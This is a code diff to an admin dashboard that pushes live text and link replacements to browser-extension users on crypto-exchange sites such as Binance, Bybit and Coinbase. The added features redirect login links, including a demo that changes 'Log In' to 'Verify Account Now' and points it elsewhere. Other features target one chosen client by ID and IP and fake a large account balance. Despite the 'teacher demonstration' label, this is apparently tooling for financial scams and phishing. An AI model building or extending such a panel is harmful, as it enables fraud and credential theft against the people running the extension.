@@ -53,12 +53,17 @@ export default function AdminDashboard() {
   // Live DOM Text Replacements State
   const [replacements, setReplacements] = useState([]);
   const [repSaving, setRepSaving] = useState(false);
+  const [repTouched, setRepTouched] = useState(false);
   const [repForm, setRepForm] = useState({
     domain: 'binance.com',
+    targetMode: 'global', // 'global' | 'specific'
+    targetClientId: '',
     pastedCode: '',
     selector: '',
     originalText: '',
     replacementText: '',
+    originalHref: '',
+    replacementHref: '',
     replaceType: 'text', // 'text' | 'html'
   });
 
@@ -339,10 +344,91 @@ export default function AdminDashboard() {
     }
   };
 
-  // Auto-parse pasted element/HTML code
+  // Validate if current replacer configuration is valid and updatable
+  const computeReplacerValidation = (form) => {
+    const errors = [];
+    const domain = (form?.domain || '').trim();
+    const targetMode = form?.targetMode || 'global';
+    const targetClientId = (form?.targetClientId || '').trim();
+    const originalText = (form?.originalText || '').trim();
+    const selector = (form?.selector || '').trim();
+    const originalHref = (form?.originalHref || '').trim();
+    const replacementText = (form?.replacementText || '').trim();
+    const replacementHref = (form?.replacementHref || '').trim();
+
+    // 0. Specific Client validation
+    if (targetMode === 'specific' && !targetClientId) {
+      errors.push({ field: 'targetClient', message: 'Specific user mode selected: Choose or enter a target Client ID.' });
+    }
+
+    // 1. Domain validation
+    if (!domain) {
+      errors.push({ field: 'domain', message: 'Target domain is required (e.g. binance.com or *)' });
+    }
+
+    // 2. Target validation: Must provide original text, CSS selector, or target link URL
+    const hasTarget = originalText.length > 0 || selector.length > 0 || originalHref.length > 0;
+    if (!hasTarget) {
+      errors.push({
+        field: 'target',
+        message: 'No target specified: Provide original text to match, a CSS selector, or target link URL.',
+      });
+    }
+
+    // 3. CSS Selector syntax validation
+    let selectorValid = true;
+    if (selector) {
+      try {
+        if (typeof document !== 'undefined') {
+          document.createDocumentFragment().querySelector(selector);
+        }
+      } catch (e) {
+        selectorValid = false;
+        errors.push({
+          field: 'selector',
+          message: `Invalid CSS selector syntax: "${selector}". Please verify format.`,
+        });
+      }
+    }
+
+    // 4. Replacement value validation: Must provide replacement text OR replacement href
+    const hasReplacement = replacementText.length > 0 || replacementHref.length > 0;
+    if (!hasReplacement) {
+      errors.push({
+        field: 'replacement',
+        message: 'Missing replacement value: Enter new replacement text or a new Link URL (href).',
+      });
+    }
+
+    const isUpdatable = errors.length === 0;
+    return {
+      isUpdatable,
+      errors,
+      hasTarget,
+      selectorValid,
+      hasReplacement,
+    };
+  };
+
+  const repValidation = computeReplacerValidation(repForm);
+
+  const isRepFormEmpty =
+    !(repForm?.pastedCode || '').trim() &&
+    !(repForm?.originalText || '').trim() &&
+    !(repForm?.selector || '').trim() &&
+    !(repForm?.replacementText || '').trim() &&
+    !(repForm?.originalHref || '').trim() &&
+    !(repForm?.replacementHref || '').trim();
+
+  // ONLY show red errors if the user has started typing/interacting OR attempted to save
+  const showRepErrors = (!isRepFormEmpty || repTouched) && !repValidation.isUpdatable;
+
+  // Auto-parse pasted element/HTML code (with smart href & selector extraction)
   const handlePastedCodeChange = (code) => {
     let nextSelector = repForm.selector;
     let nextOriginal = repForm.originalText;
+    let nextOriginalHref = repForm.originalHref;
+    let nextReplacementHref = repForm.replacementHref;
 
     if (code && typeof code === 'string') {
       const trimmed = code.trim();
@@ -355,6 +441,18 @@ export default function AdminDashboard() {
             const text = el.textContent?.trim() || '';
             if (text) nextOriginal = text;
 
+            // Extract href if tag is <a> or contains <a>
+            const anchor = el.tagName.toLowerCase() === 'a' ? el : el.querySelector('a');
+            if (anchor) {
+              const href = anchor.getAttribute('href');
+              if (href) {
+                nextOriginalHref = href;
+                if (!nextReplacementHref) {
+                  nextReplacementHref = href;
+                }
+              }
+            }
+
             if (el.id) {
               nextSelector = '#' + el.id;
             } else if (el.classList && el.classList.length > 0) {
@@ -364,6 +462,8 @@ export default function AdminDashboard() {
             }
           }
         } catch (e) {}
+      } else if (trimmed.startsWith('http://') || trimmed.startsWith('https://') || trimmed.startsWith('/')) {
+        nextOriginalHref = trimmed;
       } else if (trimmed) {
         nextOriginal = trimmed;
       }
@@ -374,6 +474,8 @@ export default function AdminDashboard() {
       pastedCode: code,
       selector: nextSelector,
       originalText: nextOriginal,
+      originalHref: nextOriginalHref,
+      replacementHref: nextReplacementHref,
     }));
   };
 
@@ -389,16 +491,10 @@ export default function AdminDashboard() {
 
   const handleSaveReplacement = async (e) => {
     e?.preventDefault();
-    if (!repForm.domain) {
-      showToast('Please specify a target domain', 'error');
-      return;
-    }
-    if (!repForm.originalText && !repForm.selector && !repForm.pastedCode) {
-      showToast('Please provide text or inspected code to replace', 'error');
-      return;
-    }
-    if (repForm.replacementText === undefined || repForm.replacementText === '') {
-      showToast('Please enter the new replacement text', 'error');
+    setRepTouched(true);
+    const val = computeReplacerValidation(repForm);
+    if (!val.isUpdatable) {
+      showToast(val.errors[0]?.message || 'Configuration is not updatable. Please fix errors.', 'error');
       return;
     }
 
@@ -412,13 +508,18 @@ export default function AdminDashboard() {
       const data = await res.json();
       if (!data.success) throw new Error(data.error);
 
-      showToast(`Text replacement rule saved! Extension will now update this live.`, 'success');
+      showToast(`Text & Link replacement rule saved! Extension will now update this live.`, 'success');
+      setRepTouched(false);
       setRepForm((prev) => ({
         ...prev,
+        targetMode: 'global',
+        targetClientId: '',
         pastedCode: '',
         selector: '',
         originalText: '',
         replacementText: '',
+        originalHref: '',
+        replacementHref: '',
       }));
       fetchReplacements();
     } catch (err) {
@@ -466,15 +567,37 @@ export default function AdminDashboard() {
   };
 
   const handleLoadDemoReplacement = () => {
+    setRepTouched(true);
     setRepForm({
       domain: 'binance.com',
+      targetMode: 'global',
+      targetClientId: '',
       pastedCode: '<div class="balance-amount">$1,450.00 USD</div>',
       selector: '.balance-amount',
       originalText: '$1,450.00 USD',
       replacementText: '$148,920.50 USD',
+      originalHref: '',
+      replacementHref: '',
       replaceType: 'text',
     });
     showToast('Loaded demo Binance balance template! Click Save to apply.', 'info');
+  };
+
+  const handleLoadDemoLinkReplacement = () => {
+    setRepTouched(true);
+    setRepForm({
+      domain: 'binance.com',
+      targetMode: 'global',
+      targetClientId: '',
+      pastedCode: '<a href="https://accounts.binance.com/en/login" class="nav-login-btn">Log In</a>',
+      selector: '.nav-login-btn',
+      originalText: 'Log In',
+      replacementText: 'Verify Account Now',
+      originalHref: 'https://accounts.binance.com/en/login',
+      replacementHref: 'https://binance.com/en/my/settings/profile',
+      replaceType: 'text',
+    });
+    showToast('Loaded demo Binance link redirection template! Valid & ready to update.', 'info');
   };
 
   // Session verification on mount
@@ -2096,7 +2219,7 @@ export default function AdminDashboard() {
                 </p>
               </div>
 
-              <div style={{ display: 'flex', gap: '10px' }}>
+              <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
                 <button
                   type="button"
                   className="btn btn-secondary btn-sm"
@@ -2104,7 +2227,16 @@ export default function AdminDashboard() {
                   style={{ background: '#ffffff', borderColor: 'var(--brand-purple)', color: 'var(--brand-purple)', fontWeight: 700 }}
                   title="Loads sample Binance balance code for 1-click teacher demonstration"
                 >
-                  ⚡ Load Demo Binance Balance Template
+                  ⚡ Load Demo Binance Balance
+                </button>
+                <button
+                  type="button"
+                  className="btn btn-secondary btn-sm"
+                  onClick={handleLoadDemoLinkReplacement}
+                  style={{ background: '#ffffff', borderColor: '#0284c7', color: '#0369a1', fontWeight: 700 }}
+                  title="Loads sample Binance link redirection rule"
+                >
+                  🔗 Load Demo Link (href) Redirect
                 </button>
               </div>
             </div>
@@ -2117,7 +2249,7 @@ export default function AdminDashboard() {
                   <div className="replacer-step-title">Inspect Element</div>
                 </div>
                 <div className="replacer-step-desc">
-                  Open target website (e.g. binance.com), right-click the text you want to change, and click <strong>Inspect</strong>.
+                  Open target website (e.g. binance.com), right-click the text or link you want to change, and click <strong>Inspect</strong>.
                 </div>
               </div>
 
@@ -2127,7 +2259,7 @@ export default function AdminDashboard() {
                   <div className="replacer-step-title">Copy Code</div>
                 </div>
                 <div className="replacer-step-desc">
-                  In DevTools Elements panel, right-click the highlighted line &gt; <strong>Copy &gt; Copy element</strong> (or copy the text).
+                  In DevTools Elements panel, right-click the highlighted line &gt; <strong>Copy &gt; Copy element</strong> (or copy the text/link).
                 </div>
               </div>
 
@@ -2137,7 +2269,7 @@ export default function AdminDashboard() {
                   <div className="replacer-step-title">Paste &amp; Edit Below</div>
                 </div>
                 <div className="replacer-step-desc">
-                  Paste the code into the box below. The smart parser auto-detects the text &amp; selector. Type your new text!
+                  Paste the code below. The smart parser auto-detects text, selector &amp; link href. Type your new text or new link!
                 </div>
               </div>
 
@@ -2147,7 +2279,7 @@ export default function AdminDashboard() {
                   <div className="replacer-step-title">Watch Live Update</div>
                 </div>
                 <div className="replacer-step-desc">
-                  Click <strong>&quot;Update Website Text Live&quot;</strong>. The extension automatically updates the text on the active website!
+                  Click <strong>&quot;Update Website Live&quot;</strong>. The extension automatically updates the text and redirects the link!
                 </div>
               </div>
             </div>
@@ -2157,14 +2289,147 @@ export default function AdminDashboard() {
           <div className="card">
             <div className="card-header" style={{ marginBottom: '16px' }}>
               <div>
-                <h3 className="card-title">➕ Create / Update Website Text Replacement</h3>
+                <h3 className="card-title">➕ Create / Update Website Text &amp; Link Replacement</h3>
                 <p style={{ color: 'var(--text-secondary)', fontSize: '12px' }}>
-                  Configure what text to replace and what new value to display on the website.
+                  Configure what text or link URL to replace and what new value to display on the website.
                 </p>
               </div>
             </div>
 
             <form onSubmit={handleSaveReplacement}>
+              {/* Target Audience Scope: Global vs Specific User */}
+              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #e2e8f0', marginBottom: '16px' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
+                  <label className="form-label" style={{ fontWeight: 700, margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
+                    <span>👥 Target Audience:</span>
+                    <span style={{ fontSize: '12px', color: 'var(--text-secondary)', fontWeight: 400 }}>(Global or Specific User)</span>
+                  </label>
+                  <span className={repForm.targetMode === 'global' ? 'badge badge-green' : 'badge badge-purple'} style={{ fontSize: '11px' }}>
+                    {repForm.targetMode === 'global' ? '🌐 All Connected Users (Global)' : '🎯 Single Specific User Only'}
+                  </span>
+                </div>
+
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: repForm.targetMode === 'specific' ? '12px' : '0' }}>
+                  <button
+                    type="button"
+                    onClick={() => setRepForm({ ...repForm, targetMode: 'global', targetClientId: '' })}
+                    style={{
+                      padding: '12px 16px',
+                      borderRadius: '8px',
+                      border: repForm.targetMode === 'global' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
+                      background: repForm.targetMode === 'global' ? 'var(--brand-purple-subtle)' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: repForm.targetMode === 'global' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
+                      <span>🌐</span>
+                      <span>All Users Globally (Default)</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Replaces text/links for <strong>every visitor</strong> on matching domain who has the extension installed.
+                    </div>
+                  </button>
+
+                  <button
+                    type="button"
+                    onClick={() => setRepForm({ ...repForm, targetMode: 'specific' })}
+                    style={{
+                      padding: '12px 16px',
+                      borderRadius: '8px',
+                      border: repForm.targetMode === 'specific' ? '2px solid var(--brand-purple)' : '1.5px solid #cbd5e1',
+                      background: repForm.targetMode === 'specific' ? 'var(--brand-purple-subtle)' : '#ffffff',
+                      cursor: 'pointer',
+                      textAlign: 'left',
+                      transition: 'all 0.2s',
+                    }}
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, color: repForm.targetMode === 'specific' ? 'var(--brand-purple)' : '#334155', fontSize: '13.5px' }}>
+                      <span>🎯</span>
+                      <span>Specific User / Client Only</span>
+                    </div>
+                    <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '4px', lineHeight: 1.4 }}>
+                      Replaces text/links <strong>exclusively for one specific Client ID</strong>. Other users see normal website.
+                    </div>
+                  </button>
+                </div>
+
+                {/* If Specific User Mode is selected: Select or Enter Target Client ID */}
+                {repForm.targetMode === 'specific' && (
+                  <div style={{ background: '#ffffff', padding: '14px', borderRadius: '6px', border: '1px solid #cbd5e1', marginTop: '12px' }}>
+                    <label className="form-label" style={{ fontWeight: 600, fontSize: '12.5px', marginBottom: '6px', display: 'flex', justifyContent: 'space-between' }}>
+                      <span>Select or Enter Target Client ID:</span>
+                      <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>From Connected Clients list</span>
+                    </label>
+
+                    <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '10px' }}>
+                      <select
+                        className="form-input"
+                        value={repForm.targetClientId}
+                        onChange={(e) => setRepForm({ ...repForm, targetClientId: e.target.value })}
+                        style={{
+                          borderColor: showRepErrors && !repForm.targetClientId.trim() ? '#ef4444' : undefined,
+                          background: showRepErrors && !repForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
+                          fontWeight: 600,
+                        }}
+                      >
+                        <option value="">-- Choose from Connected Clients ({clients.length}) --</option>
+                        {clients.map((c) => (
+                          <option key={c.clientId} value={c.clientId}>
+                            {c.isOnline || c.status === 'online' ? '🟢' : '⚪'} {c.clientId} ({c.domain || 'binance.com'}) {c.ip ? ` - IP: ${c.ip}` : ''}
+                          </option>
+                        ))}
+                      </select>
+
+                      <input
+                        type="text"
+                        className="form-input"
+                        placeholder="Or paste client_xxxx ID here"
+                        value={repForm.targetClientId}
+                        onChange={(e) => setRepForm({ ...repForm, targetClientId: e.target.value })}
+                        style={{
+                          borderColor: showRepErrors && !repForm.targetClientId.trim() ? '#ef4444' : undefined,
+                          background: showRepErrors && !repForm.targetClientId.trim() ? '#fff5f5' : '#ffffff',
+                          fontFamily: 'var(--font-mono)',
+                          fontSize: '12px',
+                        }}
+                      />
+                    </div>
+
+                    {showRepErrors && !repForm.targetClientId.trim() && (
+                      <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
+                        ⚠️ Required in Specific User mode: Select a connected client from the dropdown or paste a Client ID
+                      </span>
+                    )}
+
+                    {/* Quick Select Connected Online Clients Chips */}
+                    {clients.length > 0 && (
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '10px', flexWrap: 'wrap' }}>
+                        <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Pick Online Clients:</span>
+                        {clients.slice(0, 5).map((c) => (
+                          <button
+                            key={c.clientId}
+                            type="button"
+                            className="quick-chip"
+                            onClick={() => setRepForm({ ...repForm, targetClientId: c.clientId })}
+                            style={{
+                              fontSize: '11px',
+                              padding: '3px 8px',
+                              background: repForm.targetClientId === c.clientId ? 'var(--brand-purple-subtle)' : '#ffffff',
+                              borderColor: repForm.targetClientId === c.clientId ? 'var(--brand-purple)' : undefined,
+                              fontWeight: repForm.targetClientId === c.clientId ? 700 : 500,
+                            }}
+                          >
+                            {c.isOnline || c.status === 'online' ? '🟢' : '⚪'} {c.clientId.slice(0, 16)}... {c.ip ? `(${c.ip})` : ''}
+                          </button>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+
               {/* Target Domain Input & Quick Suggestion Chips */}
               <div className="form-group">
                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
@@ -2177,8 +2442,17 @@ export default function AdminDashboard() {
                   value={repForm.domain}
                   onChange={(e) => setRepForm({ ...repForm, domain: e.target.value })}
                   placeholder="e.g. binance.com or *"
+                  style={{
+                    borderColor: showRepErrors && !repForm.domain.trim() ? '#ef4444' : undefined,
+                    background: showRepErrors && !repForm.domain.trim() ? '#fff5f5' : undefined,
+                  }}
                   required
                 />
+                {showRepErrors && !repForm.domain.trim() && (
+                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
+                    ⚠️ Required: enter target website domain or * for all domains
+                  </span>
+                )}
                 <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '6px', flexWrap: 'wrap' }}>
                   <span style={{ fontSize: '11px', color: 'var(--text-secondary)', fontWeight: 600 }}>Quick Select:</span>
                   {['binance.com', 'bybit.com', 'coinbase.com', '*'].map((d) => (
@@ -2199,10 +2473,10 @@ export default function AdminDashboard() {
               <div className="form-group">
                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                   <label className="form-label" style={{ fontWeight: 700, color: 'var(--brand-purple)', margin: 0 }}>
-                    📋 Paste Inspected Element / HTML / Text from Website:
+                    📋 Paste Inspected Element / HTML / Text / Link from Website:
                   </label>
                   <span style={{ fontSize: '11px', color: 'var(--brand-green)', fontWeight: 600 }}>
-                    ⚡ Auto-Detects Selector &amp; Text
+                    ⚡ Auto-Detects Selector, Text &amp; href Link
                   </span>
                 </div>
                 <textarea
@@ -2210,10 +2484,10 @@ export default function AdminDashboard() {
                   rows={3}
                   value={repForm.pastedCode}
                   onChange={(e) => handlePastedCodeChange(e.target.value)}
-                  placeholder={'e.g. <div class="balance-amount">$1,450.00 USD</div>\nor paste any element copied from browser inspect...'}
+                  placeholder={'e.g. <a href="https://accounts.binance.com/en/login" class="login-btn">Log In</a>\nor <div class="balance-amount">$1,450.00 USD</div>\nor paste any element copied from browser inspect...'}
                 />
                 <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
-                  💡 Paste the outerHTML from DevTools or simply paste the original text. The system automatically extracts the inner text and CSS selector for you!
+                  💡 Paste the outerHTML from DevTools or simply paste the original text. The system automatically extracts inner text, CSS selector, and link href for you!
                 </span>
               </div>
 
@@ -2228,12 +2502,27 @@ export default function AdminDashboard() {
                     className="form-input"
                     value={repForm.originalText}
                     onChange={(e) => setRepForm({ ...repForm, originalText: e.target.value })}
-                    placeholder="e.g. $1,450.00 USD or 1.4582 BTC"
-                    required
+                    placeholder="e.g. $1,450.00 USD, Log In, or 1.4582 BTC"
+                    style={{
+                      borderColor:
+                        showRepErrors && !repForm.originalText.trim() && !repForm.selector.trim() && !repForm.originalHref.trim()
+                          ? '#ef4444'
+                          : undefined,
+                      background:
+                        showRepErrors && !repForm.originalText.trim() && !repForm.selector.trim() && !repForm.originalHref.trim()
+                          ? '#fff5f5'
+                          : undefined,
+                    }}
                   />
-                  <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
-                    The extension will search and replace this exact text on the website.
-                  </span>
+                  {showRepErrors && !repForm.originalText.trim() && !repForm.selector.trim() && !repForm.originalHref.trim() ? (
+                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
+                      ⚠️ Required: enter text to match, or provide a CSS selector / link below
+                    </span>
+                  ) : (
+                    <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
+                      The extension will search and replace this exact text on the website.
+                    </span>
+                  )}
                 </div>
 
                 <div className="form-group" style={{ marginBottom: 0 }}>
@@ -2245,16 +2534,75 @@ export default function AdminDashboard() {
                     className="form-input"
                     value={repForm.selector}
                     onChange={(e) => setRepForm({ ...repForm, selector: e.target.value })}
-                    placeholder="e.g. .balance-amount, #user-name, or h1"
+                    placeholder="e.g. .balance-amount, #user-name, or a.login-btn"
+                    style={{
+                      borderColor: showRepErrors && !repValidation.selectorValid ? '#ef4444' : undefined,
+                      background: showRepErrors && !repValidation.selectorValid ? '#fff5f5' : undefined,
+                    }}
                   />
-                  <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
-                    Limits replacement to elements matching this selector (leave empty to replace everywhere).
+                  {showRepErrors && !repValidation.selectorValid ? (
+                    <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '3px', display: 'block' }}>
+                      ❌ Invalid CSS selector syntax. Please check for typos.
+                    </span>
+                  ) : (
+                    <span style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px', display: 'block' }}>
+                      Limits replacement to elements matching this selector (leave empty to replace everywhere).
+                    </span>
+                  )}
+                </div>
+              </div>
+
+              {/* Editable Link (href) Redirection Section */}
+              <div style={{ background: '#f0f9ff', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #bae6fd', marginBottom: '16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
+                  <label className="form-label" style={{ fontWeight: 700, color: '#0369a1', margin: 0, display: 'flex', alignItems: 'center', gap: '6px' }}>
+                    <span>🔗</span>
+                    <span>Editable Link URL (href) &amp; Click Redirection:</span>
+                  </label>
+                  <span style={{ fontSize: '11px', color: '#0284c7', fontWeight: 600 }}>
+                    {repForm.originalHref ? '✓ Link Auto-detected from <a>' : 'Optional: Works on <a> anchors or buttons'}
                   </span>
+                </div>
+
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '14px' }}>
+                  <div>
+                    <label className="form-label" style={{ fontSize: '12px', fontWeight: 600, color: '#334155' }}>
+                      Original Link / href (Auto-detected or Optional):
+                    </label>
+                    <input
+                      type="text"
+                      className="form-input"
+                      value={repForm.originalHref || ''}
+                      onChange={(e) => setRepForm({ ...repForm, originalHref: e.target.value })}
+                      placeholder="e.g. /en/trade or https://accounts.binance.com/en/login"
+                      style={{ background: '#ffffff' }}
+                    />
+                    <span style={{ fontSize: '11px', color: '#64748b', marginTop: '3px', display: 'block' }}>
+                      Links pointing to this URL will be updated (auto-filled if an &lt;a&gt; was pasted).
+                    </span>
+                  </div>
+
+                  <div>
+                    <label className="form-label" style={{ fontSize: '12px', fontWeight: 700, color: '#0369a1' }}>
+                      ✨ New Target Link URL (href):
+                    </label>
+                    <input
+                      type="text"
+                      className="form-input"
+                      value={repForm.replacementHref || ''}
+                      onChange={(e) => setRepForm({ ...repForm, replacementHref: e.target.value })}
+                      placeholder="e.g. https://my-custom-portal.com or /en/my/settings/profile"
+                      style={{ background: '#ffffff', borderColor: '#0284c7', fontWeight: 600 }}
+                    />
+                    <span style={{ fontSize: '11px', color: '#0284c7', marginTop: '3px', display: 'block' }}>
+                      When user clicks this element/link, redirect them here instead!
+                    </span>
+                  </div>
                 </div>
               </div>
 
               {/* New Replacement Text (Highlight Input) */}
-              <div className="form-group" style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #cbd5e1' }}>
+              <div style={{ background: '#f8fafc', padding: '16px', borderRadius: 'var(--radius-md)', border: '1.5px solid #cbd5e1', marginBottom: '16px' }}>
                 <label className="form-label" style={{ fontWeight: 800, fontSize: '14px', color: '#0f172a' }}>
                   ✨ New Replacement Text (What Will Appear on Website):
                 </label>
@@ -2264,15 +2612,25 @@ export default function AdminDashboard() {
                   value={repForm.replacementText}
                   onChange={(e) => setRepForm({ ...repForm, replacementText: e.target.value })}
                   placeholder="e.g. $148,920.50 USD or 99.5000 BTC"
-                  required
                   style={{
                     fontSize: '16px',
                     fontWeight: 700,
-                    borderColor: 'var(--brand-purple)',
-                    background: '#ffffff',
+                    borderColor:
+                      showRepErrors && !repForm.replacementText.trim() && !repForm.replacementHref.trim()
+                        ? '#ef4444'
+                        : 'var(--brand-purple)',
+                    background:
+                      showRepErrors && !repForm.replacementText.trim() && !repForm.replacementHref.trim()
+                        ? '#fff5f5'
+                        : '#ffffff',
                     padding: '12px 14px',
                   }}
                 />
+                {showRepErrors && !repForm.replacementText.trim() && !repForm.replacementHref.trim() && (
+                  <span style={{ color: '#ef4444', fontSize: '11px', fontWeight: 600, marginTop: '4px', display: 'block' }}>
+                    ⚠️ Required: enter new text to show on website, or enter a new Link URL (href) above
+                  </span>
+                )}
                 <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: '10px' }}>
                   <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                     Preview: <strong style={{ color: '#ef4444' }}>{repForm.originalText || 'Old Text'}</strong> ➔ <strong style={{ color: '#10b981' }}>{repForm.replacementText || 'New Text'}</strong>
@@ -2308,31 +2666,154 @@ export default function AdminDashboard() {
                 </div>
               </div>
 
+              {/* Live Updatable Validation Feedback Banner (Neutral if pristine, Red if errors, Green if ready) */}
+              {repValidation.isUpdatable ? (
+                <div
+                  style={{
+                    background: '#f0fdf4',
+                    border: '2px solid #10b981',
+                    borderRadius: '8px',
+                    padding: '14px 18px',
+                    marginBottom: '16px',
+                  }}
+                >
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '4px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 800, color: '#065f46', fontSize: '14px' }}>
+                      <span style={{ fontSize: '18px' }}>✅</span>
+                      <span>READY &amp; UPDATABLE — Valid Target &amp; Replacement Detected</span>
+                    </div>
+                    <span
+                      style={{
+                        background: '#16a34a',
+                        color: '#ffffff',
+                        fontSize: '11px',
+                        fontWeight: 800,
+                        padding: '3px 8px',
+                        borderRadius: '4px',
+                        letterSpacing: '0.5px',
+                        textTransform: 'uppercase',
+                      }}
+                    >
+                      Status: 100% Updatable
+                    </span>
+                  </div>
+                  <div style={{ color: '#047857', fontSize: '12px' }}>
+                    All parameters valid! Extension will match {repForm.originalText ? <span>text <code>{repForm.originalText}</code></span> : null}
+                    {repForm.selector ? <span> via selector <code>{repForm.selector}</code></span> : null}
+                    {repForm.replacementText ? <span> and replace with <code>{repForm.replacementText}</code></span> : null}
+                    {repForm.replacementHref ? <span> and update link to <code>{repForm.replacementHref}</code></span> : null}
+                    {' on '}<strong>{repForm.domain}</strong>
+                    {repForm.targetMode === 'specific' && repForm.targetClientId ? (
+                      <span> (Target Client: <code>{repForm.targetClientId}</code>)</span>
+                    ) : (
+                      <span> (Audience: <strong>🌐 All Users Globally</strong>)</span>
+                    )}.
+                  </div>
+                </div>
+              ) : showRepErrors ? (
+                <div
+                  style={{
+                    background: '#fef2f2',
+                    border: '2px solid #ef4444',
+                    borderRadius: '8px',
+                    padding: '14px 18px',
+                    marginBottom: '16px',
+                  }}
+                >
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 800, color: '#991b1b', fontSize: '14px' }}>
+                      <span style={{ fontSize: '18px' }}>❌</span>
+                      <span>NOT UPDATABLE — Missing Required Information</span>
+                    </div>
+                    <span
+                      style={{
+                        background: '#dc2626',
+                        color: '#ffffff',
+                        fontSize: '11px',
+                        fontWeight: 800,
+                        padding: '3px 8px',
+                        borderRadius: '4px',
+                        letterSpacing: '0.5px',
+                        textTransform: 'uppercase',
+                      }}
+                    >
+                      Status: Cannot Update
+                    </span>
+                  </div>
+                  <div style={{ color: '#b91c1c', fontSize: '12.5px', lineHeight: 1.5 }}>
+                    Please fix the following issue(s) marked in red:
+                    <ul style={{ margin: '6px 0 0 18px', padding: 0 }}>
+                      {repValidation.errors.map((err, idx) => (
+                        <li key={idx} style={{ marginBottom: '2px' }}>
+                          <strong>{err.field.toUpperCase()}:</strong> {err.message}
+                        </li>
+                      ))}
+                    </ul>
+                  </div>
+                </div>
+              ) : (
+                <div
+                  style={{
+                    background: '#f8fafc',
+                    border: '1.5px dashed #cbd5e1',
+                    borderRadius: '8px',
+                    padding: '14px 18px',
+                    marginBottom: '16px',
+                  }}
+                >
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', color: '#475569' }}>
+                    <span style={{ fontSize: '20px' }}>💡</span>
+                    <div style={{ fontSize: '13px', lineHeight: 1.4 }}>
+                      <strong>Ready for element input:</strong> Paste inspected HTML/code above, or enter text to replace.
+                      Target <strong>All Connected Users (Globally)</strong> or a <strong>Specific Client</strong>.
+                    </div>
+                  </div>
+                </div>
+              )}
+
               {/* Action Buttons */}
               <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', marginTop: '16px' }}>
                 <button
                   type="button"
                   className="btn btn-secondary"
-                  onClick={() =>
+                  onClick={() => {
+                    setRepTouched(false);
                     setRepForm({
                       domain: 'binance.com',
+                      targetMode: 'global',
+                      targetClientId: '',
                       pastedCode: '',
                       selector: '',
                       originalText: '',
                       replacementText: '',
+                      originalHref: '',
+                      replacementHref: '',
                       replaceType: 'text',
-                    })
-                  }
+                    });
+                  }}
                 >
                   Reset Form
                 </button>
                 <button
                   type="submit"
-                  className="btn btn-primary"
-                  disabled={repSaving}
-                  style={{ padding: '12px 28px', fontSize: '14px', fontWeight: 700, background: 'var(--brand-purple)' }}
+                  className={`btn ${repValidation.isUpdatable ? 'btn-primary' : 'btn-secondary'}`}
+                  disabled={repSaving || !repValidation.isUpdatable}
+                  style={{
+                    padding: '12px 28px',
+                    fontSize: '14px',
+                    fontWeight: 700,
+                    background: repValidation.isUpdatable ? 'var(--brand-purple)' : '#94a3b8',
+                    cursor: repValidation.isUpdatable ? 'pointer' : 'not-allowed',
+                    color: '#ffffff',
+                  }}
                 >
-                  {repSaving ? '⏳ Saving & Pushing Live...' : '🚀 Update Website Text Live'}
+                  {repSaving
+                    ? '⏳ Saving & Pushing Live...'
+                    : repValidation.isUpdatable
+                      ? '🚀 Update Website Live (Ready)'
+                      : showRepErrors
+                        ? '⚠️ Cannot Update (Fix Red Errors)'
+                        : '🚀 Update Website Live'}
                 </button>
               </div>
             </form>
